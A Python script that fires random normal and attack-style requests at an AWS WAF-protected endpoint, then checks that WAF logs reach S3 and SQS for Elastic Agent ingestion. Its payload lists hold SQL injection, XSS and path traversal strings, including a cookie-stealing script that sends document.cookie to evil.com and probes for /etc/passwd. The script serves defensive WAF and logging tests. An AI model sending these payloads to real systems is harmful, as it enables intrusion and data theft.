#!/usr/bin/env python3
import argparse
import boto3
import concurrent.futures
import json
import logging
import random
import requests
import time
from urllib.parse import urlparse

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# List of SQL injection payloads to test WAF rules
SQL_INJECTION_PAYLOADS = [
    "' OR 1=1 --",
    "1' OR '1'='1",
    "1; DROP TABLE users",
    "1 UNION SELECT username, password FROM users",
    "' OR 1=1 /*",
    "admin' --",
    "'; SELECT * FROM information_schema.tables;--",
    "' UNION SELECT NULL, NULL, NULL, NULL, NULL--",
    "1' ORDER BY 10--",
    "admin' OR '1'='1"
]

# List of XSS payloads to test WAF rules
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "<script>fetch('https://evil.com?cookie='+document.cookie)</script>",
    "'\"><script>alert(document.cookie)</script>",
    "<img src=\"x\" onerror=\"alert(document.domain)\">",
    "<iframe src=\"javascript:alert(`xss`)\"></iframe>",
    "<details open ontoggle=alert(1)>"
]

def parse_args():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description='Test AWS WAF and verify logs')
    parser.add_argument('--url', required=False, help='The WAF-protected endpoint URL')
    parser.add_argument('--s3-bucket', required=False, help='S3 bucket name containing WAF logs')
    parser.add_argument('--sqs-queue-url', required=False, help='SQS queue URL for S3 notifications')
    parser.add_argument('--requests', type=int, default=50, help='Number of requests to send (default: 50)')
    parser.add_argument('--max-workers', type=int, default=5, help='Max number of concurrent workers (default: 5)')
    return parser.parse_args()

def generate_random_request(base_url):
    """Generate a random request that might trigger WAF rules."""
    path = random.choice(['', 'api', 'users', 'search', 'login', 'admin'])
    full_url = f"{base_url}/{path}" if path else base_url
    
    # Choose a request type randomly
    request_type = random.choice(['normal', 'sql_injection', 'xss', 'path_traversal', 'large_body'])
    
    if request_type == 'normal':
        # Normal request with random parameters
        params = {
            'id': random.randint(1, 1000),
            'page': random.randint(1, 100),
            'limit': random.randint(10, 50)
        }
        return requests.get(full_url, params=params)
    
    elif request_type == 'sql_injection':
        # SQL injection attempt
        payload = random.choice(SQL_INJECTION_PAYLOADS)
        params = {'id': payload}
        return requests.get(full_url, params=params)
    
    elif request_type == 'xss':
        # XSS attempt
        payload = random.choice(XSS_PAYLOADS)
        params = {'search': payload}
        return requests.get(full_url, params=params)
    
    elif request_type == 'path_traversal':
        # Path traversal attempt
        payload = random.choice(['../../../etc/passwd', '..%2f..%2f..%2fetc%2fpasswd', '/etc/passwd%00'])
        return requests.get(f"{base_url}/{payload}")
    
    elif request_type == 'large_body':
        # Large body request
        large_body = 'A' * random.randint(5000, 10000)
        headers = {'Content-Type': 'application/json'}
        data = {'data': large_body}
        return requests.post(full_url, headers=headers, json=data)

def send_request(base_url, request_id):
    """Send a request and log the result."""
    try:
        start_time = time.time()
        response = generate_random_request(base_url)
        end_time = time.time()
        
        logger.info(f"Request {request_id}: {response.status_code} - {round((end_time - start_time) * 1000)}ms")
        return True
    except Exception as e:
        logger.error(f"Request {request_id} failed: {str(e)}")
        return False

def check_s3_for_logs(bucket_name):
    """Check if WAF logs are being delivered to S3."""
    try:
        s3 = boto3.client('s3')
        response = s3.list_objects_v2(
            Bucket=bucket_name,
            Prefix='AWSLogs/',
            MaxKeys=10
        )
        
        if 'Contents' in response:
            logger.info(f"Found {len(response['Contents'])} objects in S3 bucket {bucket_name}")
            for obj in response['Contents']:
                logger.info(f"  - {obj['Key']} ({obj['Size']} bytes)")
            return True
        else:
            logger.warning(f"No objects found in S3 bucket {bucket_name} with prefix 'AWSLogs/'")
            return False
    except Exception as e:
        logger.error(f"Error checking S3 bucket: {str(e)}")
        return False

def check_sqs_for_notifications(queue_url):
    """Check if SQS is receiving notifications for new S3 objects."""
    try:
        sqs = boto3.client('sqs')
        response = sqs.receive_message(
            QueueUrl=queue_url,
            MaxNumberOfMessages=10,
            WaitTimeSeconds=5,
            VisibilityTimeout=10
        )
        
        if 'Messages' in response:
            logger.info(f"Found {len(response['Messages'])} messages in SQS queue")
            for msg in response['Messages']:
                body = json.loads(msg['Body'])
                logger.info(f"  - Message: {json.dumps(body, indent=2)[:200]}...")
                
                # Don't delete the message so Elastic Agent can process it
                # sqs.delete_message(QueueUrl=queue_url, ReceiptHandle=msg['ReceiptHandle'])
            return True
        else:
            logger.warning(f"No messages found in SQS queue {queue_url}")
            return False
    except Exception as e:
        logger.error(f"Error checking SQS queue: {str(e)}")
        return False

def main():
    """Main function to test WAF and verify logs."""
    args = parse_args()
    
    # Try to get parameters from Terraform outputs if not provided
    if not (args.url and args.s3_bucket and args.sqs_queue_url):
        try:
            import subprocess
            logger.info("Attempting to get parameters from Terraform outputs...")
            
            if not args.url:
                result = subprocess.run(
                    ["terraform", "output", "-raw", "waf_protected_url"], 
                    capture_output=True, text=True, check=True
                )
                args.url = result.stdout.strip()
                logger.info(f"Using URL from Terraform output: {args.url}")
            
            if not args.s3_bucket:
                result = subprocess.run(
                    ["terraform", "output", "-raw", "s3_bucket_name"], 
                    capture_output=True, text=True, check=True
                )
                args.s3_bucket = result.stdout.strip()
                logger.info(f"Using S3 bucket from Terraform output: {args.s3_bucket}")
            
            if not args.sqs_queue_url:
                result = subprocess.run(
                    ["terraform", "output", "-raw", "sqs_queue_url"], 
                    capture_output=True, text=True, check=True
                )
                args.sqs_queue_url = result.stdout.strip()
                logger.info(f"Using SQS queue URL from Terraform output: {args.sqs_queue_url}")
                
        except Exception as e:
            logger.error(f"Error getting parameters from Terraform: {str(e)}")
            logger.error("Please provide --url, --s3-bucket, and --sqs-queue-url arguments")
            return
    
    # Validate the URL
    url = args.url
    parsed_url = urlparse(url)
    if not parsed_url.scheme or not parsed_url.netloc:
        logger.error(f"Invalid URL: {url}")
        return
    
    logger.info(f"Sending {args.requests} requests to {url}...")
    
    # Send requests in parallel
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.max_workers) as executor:
        future_to_id = {executor.submit(send_request, url, i): i for i in range(args.requests)}
        
        success_count = 0
        for future in concurrent.futures.as_completed(future_to_id):
            request_id = future_to_id[future]
            try:
                if future.result():
                    success_count += 1
            except Exception as e:
                logger.error(f"Request {request_id} generated an exception: {str(e)}")
    
    logger.info(f"Completed {success_count}/{args.requests} requests successfully")
    
    # Wait a bit for logs to be processed
    logger.info("Waiting 30 seconds for logs to be processed...")
    time.sleep(30)
    
    # Check S3 for logs
    logger.info(f"Checking S3 bucket '{args.s3_bucket}' for WAF logs...")
    s3_has_logs = check_s3_for_logs(args.s3_bucket)
    
    # Check SQS for notifications
    logger.info(f"Checking SQS queue '{args.sqs_queue_url}' for notifications...")
    sqs_has_notifications = check_sqs_for_notifications(args.sqs_queue_url)
    
    if s3_has_logs:
        logger.info("✅ WAF logs are being delivered to S3 successfully")
    else:
        logger.warning("⚠️ No WAF logs found in S3 yet. This might be normal if log delivery is delayed.")
    
    if sqs_has_notifications:
        logger.info("✅ S3 notifications are being delivered to SQS successfully")
    else:
        logger.warning("⚠️ No S3 notifications found in SQS yet. This might be normal if notifications are delayed.")
    
    logger.info("Test completed. Elastic Agent should now be able to process the logs from SQS.")

if __name__ == "__main__":
    main()